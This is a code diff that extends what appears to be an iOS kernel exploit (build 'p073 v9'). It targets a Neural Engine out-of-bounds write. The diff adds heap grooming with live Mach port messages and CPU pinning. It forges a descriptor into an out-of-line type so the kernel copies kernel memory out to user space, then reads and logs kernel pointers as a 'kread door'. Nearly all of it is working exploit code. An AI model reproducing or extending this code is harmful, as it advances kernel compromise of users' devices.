@@ -49,7 +49,18 @@
 #import <netinet/in.h>
 #import <objc/message.h>
 
-#define P073_BUILD @"p073-second-table-v8-ool-swap"
+/* v9 (264 Route-A completion): the landing is kernel-attested CONSTANT —
+   record index 0xc0 (=192, the OOB-boundary record) at the FREE neighbor
+   element's offset 0. No more which-slot randomness. The positioned groom =
+   v7j prefill: LIVE PORTKIND kmsgs placed immediately before the fire
+   (0 ms interleave + CPU pinning), harvested + decoded AFTER the fire.
+   Conversion door bar (174 §5): desc_type_forged OR (body_forged AND kptr).
+   The v9 addition is read-side: a fill tail (0x0000000100000001) makes the
+   landed desc type u16 = 0x0001 = MACH_MSG_OOL — on receive, the kernel may
+   translate that forged desc and hand back a receiver-side OOL buffer whose
+   contents come from the address field's target = a kernel-bytes copyout.
+   vmread is dlsym local-prototype (no mach_vm.h — AGENTS landmine #2). */
+#define P073_BUILD @"p073-second-table-v9-conversion-door"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -137,6 +148,74 @@ static void p073_pin_cpu_b(void) {
     thread_act_t t = pthread_mach_thread_np(pthread_self());
     thread_policy_set(t, THREAD_AFFINITY_POLICY, (thread_policy_t)&ap,
                       THREAD_AFFINITY_POLICY_COUNT);
+}
+
+/* v9: fault-safe VM read (dlsym local-prototype shape per P069/P098 — no
+   <mach/mach_vm.h> import). Used to read a receiver-side OOL buffer address
+   the kernel may have handed back from a forged OOL desc. vm_read returns
+   an error kr on unmapped addresses instead of crashing. */
+static BOOL p073_vmread(uint64_t addr, uint8_t *out, uint32_t n) {
+    typedef kern_return_t (*p073_vmread_t)(mach_port_t, uint64_t, uint64_t,
+                                           uint64_t, uint64_t *);
+    static p073_vmread_t vr;
+    if (!vr) vr = (p073_vmread_t)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
+    if (!vr || !out) return NO;
+    uint64_t got = 0;   /* mach_vm_size_t* — u64 out-pointer (not type-number) */
+    kern_return_t kr = vr(mach_task_self(), addr, (uint64_t)n,
+                          (uint64_t)(uintptr_t)out, &got);
+    return kr == KERN_SUCCESS && got >= 4;
+}
+
+/* v9 OOL-copyout evidence counter (bumped by the harvest) */
+static uint32_t g_p073_oolHits;
+
+/* v9: inspect one received descriptor for the OOL conversion door.
+   Layout law (v7d, measured): {name u32 @0, pad u32 @4, type u16 @8,
+   disp u16 @10}. A fill record {sid u32, flags u32, tail 0x1000000001}
+   on a desc => tail lo32 bytes = {type 0x0001, disp 0x0000}, hi32 @12.
+   An OOL-classified desc's first 8 bytes = the ADDRESS field (arm64
+   64-bit): name | (pad << 32). If the kernel PROCESSED the forged OOL
+   desc during our receive (we got MACH_MSG_SUCCESS back with these words),
+   the address either points at the original kernel object (ipc_port etc.)
+   or the receiver-side copy it made. Read it fault-safely; kernel-range
+   patterns or non-0xCC bytes = conversion evidence. */
+static void p073_ool_probe(uint32_t idx, uint32_t name, uint32_t padw,
+                           uint16_t dtype, uint16_t ddisp) {
+    uint64_t addr = (uint64_t)name | ((uint64_t)padw << 32);
+    uint8_t buf[32];
+    memset(buf, 0xCC, sizeof buf);
+    BOOL ok = p073_vmread(addr, buf, sizeof buf);
+    if (!ok) {
+        p073_log(@"  [v9] OOL forged desc[%u] type=0x%04x disp=0x%04x addr=0x%012llx — "
+                 @"not readable from user (desc unprocessed or EFAULT) — honest",
+                 idx, dtype, ddisp, addr);
+        return;
+    }
+    BOOL nonzero = NO, kptr = NO;
+    for (uint32_t k = 0; k < 8; k++) if (buf[k] != 0xCC) { nonzero = YES; break; }
+    for (uint32_t k = 0; k + 8 <= sizeof buf; k += 8) {
+        uint64_t q; memcpy(&q, buf + k, 8);
+        if (q >= 0xFFFFFE0000000000ULL && q < 0xFFFFFFF000000000ULL) kptr = YES;
+    }
+    if (nonzero || kptr) {
+        g_p073_oolHits++;
+        p073_log(@"  [v9] OOL COPYOUT desc[%u] addr=0x%012llx readable=YES "
+                 @"nonzero=%d kernelRange=%d bytes:",
+                 idx, addr, nonzero, kptr);
+        p073_log(@"      %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
+                 buf[0], buf[1], buf[2], buf[3], buf[4], buf[5], buf[6], buf[7],
+                 buf[8], buf[9], buf[10], buf[11], buf[12], buf[13], buf[14], buf[15]);
+        p073_log(@"      %02x %02x %02x %02x %02x %02x %02x %02x ...",
+                 buf[16], buf[17], buf[18], buf[19], buf[20], buf[21], buf[22], buf[23]);
+        if (kptr) {
+            [[P007Board shared] recordEvent:@"p073_ool_copyout" kind:@"conversion"
+                                     detail:[NSString stringWithFormat:
+                                             @"desc=%u addr=0x%012llx kernelRange=YES",
+                                             idx, addr]
+                                     source:@"p073"];
+            p073_log(@"  [v9] kernel-range qwords in the copyout — the OOL kread door bar (body_forged AND kptr) evaluated YES.");
+        }
+    }
 }
 static p073_iosCreate_t  s_iosCreate;
 static p073_iosGetID_t   s_iosGetID;
@@ -393,6 +472,11 @@ static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut) {
                      @"type=0x%04x disp=0x%04x (fill record: sid=%u flags=0x%08x tail=0x%04x%04x)",
                      v->index, i, name, padw, dtype, ddisp,
                      name, padw, ddisp, dtype);
+            /* v9: a fill-tail (0x1000000001) class landing = type 0x0001 = OOL —
+               the conversion door read. Probe the address the kernel may have
+               translated (legal portdesc recv path — NOT the sealed fat-3). */
+            if (dtype == 0x0001u)
+                p073_ool_probe(i, name, padw, dtype, ddisp);
         }
     }
     if (forge) {
@@ -616,7 +700,12 @@ static NSURL *p073_model_url(NSString *name) {
     p073_held_t *sentPre  = calloc(P073_N_SENT, sizeof(p073_held_t));
     p073_held_t *holes    = calloc(P073_N_HOLES, sizeof(p073_held_t));
     p073_held_t *sentPost = calloc(P073_N_SENT, sizeof(p073_held_t));
-    uint32_t nPre = 0, nHoles = 0, nPost = 0;
+    /* v9 (264 Route-A): the prefill pair IS the positioned groom — record 192
+       lands at the free neighbor's offset 0, so LIVE portkind kmsgs placed
+       immediately before the fire (0 ms interleave, CPU-pinned) are the
+       crossing. Hoisted to tap scope; v8 leaked them unharvested. */
+    p073_held_t *fill     = calloc(2, sizeof(p073_held_t));
+    uint32_t nPre = 0, nHoles = 0, nPost = 0, nFill = 0;
 
     for (uint32_t i = 0; i < P073_N_SENT; i++) {
         mach_port_t p = p073_make_port();
@@ -742,23 +831,22 @@ static NSURL *p073_model_url(NSString *name) {
        record stream (landing L per boot: off:0/+0x10/+0x64 measured) lands
        on LIVE kmsg bodies; the phase law collects from the existing
        record[0] dumps. p088-v18 mapped-neighbor prefill law, ported. */
-    {
-        p073_held_t *v7jPrefill = calloc(2, sizeof(p073_held_t));
-        uint32_t v7jN = 0;
-        if (v7jPrefill) {
-            for (uint32_t i = 0; i < 2; i++) {
-                mach_port_t p = p073_make_port();
-                if (p == MACH_PORT_NULL) break;
-                v7jPrefill[v7jN].port = p;
-                v7jPrefill[v7jN].index = 0x4000u | i;
-                v7jPrefill[v7jN].alive = YES;
-                if (!p073_send_portkind(p, v7jPrefill[v7jN].index) &&
-                    !p073_send_simple(p, v7jPrefill[v7jN].index)) break;
-                v7jN++;
-            }
-            p073_log(@"[v7j] prefill-2: %u live neighbors before fire (0x4000 band)",
-                     v7jN);
+    if (fill) {
+        for (uint32_t i = 0; i < 2; i++) {
+            mach_port_t p = p073_make_port();
+            if (p == MACH_PORT_NULL) break;
+            fill[nFill].port = p;
+            fill[nFill].index = 0x4000u | i;
+            fill[nFill].alive = YES;
+            p073_pin_cpu_b();    /* 262/264: punch on the fire's CPU (magazine split law) */
+            if (!p073_send_portkind(p, fill[nFill].index) &&
+                !p073_send_simple(p, fill[nFill].index))
+                break;
+            nFill++;
+            p073_log(@"[v9] positioned prefill[%u]: LIVE portkind placed fire-1 hop (0x4000 band)", i);
         }
+        p073_log(@"[v9] positioned groom: %u live prefill neighbor(s) immediately before the fire "
+                 @"— record-192 crossing law (landing at off:0, no which-slot randomness)", nFill);
     }
     /* ---- FIRE: small table first (in-flight), then 254 addchain ---- */
     int pred254Attempts = 0;             /* v3 retry bookkeeping (verdict reads this) */
@@ -919,12 +1007,21 @@ static NSURL *p073_model_url(NSString *name) {
     uint32_t touched = p073_surface_scan(surfs, nSurf);
     p073_log(@"[D1] surface scan: %u touched of %u", touched, nSurf);
 
-    /* ---- D2 harvest: sentPre payload sentinels + sentPost PORT-KIND door ---- */
+    /* ---- D2 harvest: sentPre payload sentinels + positioned prefill + sentPost PORT-KIND door ---- */
+    g_p073_oolHits = 0;
     uint32_t mut = 0, clean = 0, descForged = 0;
     for (uint32_t i = 0; i < nPre; i++) {
         if (!sentPre[i].alive) continue;
         int r = p073_harvest_one(&sentPre[i], "sentPre");
         if (r < 0) mut++; else if (r > 0) clean++;
+    }
+    /* v9: the positioned groom pair — decoded FIRST (they are the record-192
+       crossing candidates; 264 law says the landing starts at their off:0) */
+    for (uint32_t i = 0; i < nFill; i++) {
+        if (!fill[i].alive) continue;
+        uint32_t forged = 0;
+        int r = p073_harvest_portkind(&fill[i], &forged);
+        if (r < 0) { mut++; descForged += forged; } else if (r > 0) clean++;
     }
     for (uint32_t i = 0; i < nPost; i++) {
         if (!sentPost[i].alive) continue;
@@ -1011,7 +1108,12 @@ static NSURL *p073_model_url(NSString *name) {
         }
     }
     /* ---- verdict ---- */
+    BOOL conv = (touched > 0 || descForged > 0 || g_p073_oolHits > 0);
     p073_log(@"=== VERDICT ===");
+    if (g_p073_oolHits > 0)
+        p073_log(@"[v9] OOL DOOR: %u forged-OOL descriptor(s) yielded receiver-side readable "
+                 @"bytes — the dumps above are the evidence; kernel-range qwords = the "
+                 @"body_forged AND kptr bar evaluated YES (the kread door).", g_p073_oolHits);
     if (touched > 0) {
         p073_log(@"conversion SIGNAL: ANE touched our IOSurface(s) — table_small consume of forged records.");
         p073_log(@"Next: identify WHICH sid landed (record dump), then passthrough model for exact control.");
@@ -1053,11 +1155,11 @@ static NSURL *p073_model_url(NSString *name) {
         }
     }
     p073_log(@"[VERDICT] kind=%s first_fail_stage=%s fires=%d ok=%d",
-             (touched > 0 || descForged > 0) ? "conversion"
+             conv ? "conversion"
                : (mut > 0 ? "occupancy" : "miss"),
-             (touched > 0 || descForged > 0) ? "none"
+             conv ? "none"
                : (mut > 0 ? "adjacency" : (!pred254Fired ? "a-fill" : "b-adjacency")),
-             (int)pred254Attempts, (touched > 0 || descForged > 0) ? 1 : 0);
+             (int)pred254Attempts, conv ? 1 : 0);
     p073_log(@"hasKread=NO. kread32 registers only from a copyout of kernel bytes we did not write.");
     p073_log(@"One TAP per force-quit. Reboot if ANE/kmsg state is dirty.");
 
@@ -1068,6 +1170,9 @@ static NSURL *p073_model_url(NSString *name) {
 
     for (uint32_t i = 0; i < nPre; i++)
         if (sentPre[i].port != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), sentPre[i].port);
+    for (uint32_t i = 0; i < nFill; i++)
+        if (fill[i].port != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), fill[i].port);
+    free(fill);
     for (uint32_t i = 0; i < nHoles; i++)
         if (holes[i].port != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), holes[i].port);
     for (uint32_t i = 0; i < nPost; i++)
